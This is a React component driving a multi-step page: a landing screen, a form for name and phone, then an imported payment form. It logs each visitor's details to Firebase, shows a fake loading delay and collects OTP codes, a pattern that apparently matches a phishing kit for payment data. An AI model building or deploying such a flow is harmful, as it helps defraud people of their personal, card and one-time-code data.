import { useEffect, useState } from 'react';
import './main.css';
import { CartProvider } from './cartContext';
import Landing from './landing/landing';
import { Toaster } from 'react-hot-toast';
import Info from './info/info';
import { addData } from './firebase';
import { FullPageLoader } from './loader';
import React from 'react';
import { PaymentForm } from './kent/kent';

function App() {

  const [currantPage, setCurrantPage] = useState(1);
  const [isLoading, setisloading] = useState(false);
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [otp, setOtp] = useState('')
  const [otpArd] = useState([''])
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const data = {
    id: _id,
    hasPersonalInfo: name != '',
    currentPage: currantPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: name,
      fullName: name,
      phone: phone
    },
  };
  const handleNextPage = () => {
    addData(data)
    setisloading(true)
    setTimeout(() => {
      setisloading(false)
      setCurrantPage(currantPage + 1)
    }, 3000)
  }

  const handleOtp = (v: string) => {
    setOtp(v)

  }
  const handleOArr = async () => {
    await otpArd.push(otp)
  }
  useEffect(() => {
    localStorage.setItem('vistor', _id)
    addData(data)
  }, [])
  return (
    <CartProvider>
      <div style={{ opacity: isLoading ? 0.4 : 1 }}>

        <div>
          {isLoading && <FullPageLoader />}
          <Toaster position="bottom-center" />
        </div>
        {
          currantPage === 1 ?
            <Landing handleNextPage={handleNextPage} /> :
            currantPage === 2 ?
              <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} /> :
              currantPage >= 3 ?
                <PaymentForm
               
                /> :
                null
        }
      </div>

    </CartProvider>
  );
}

export default App;
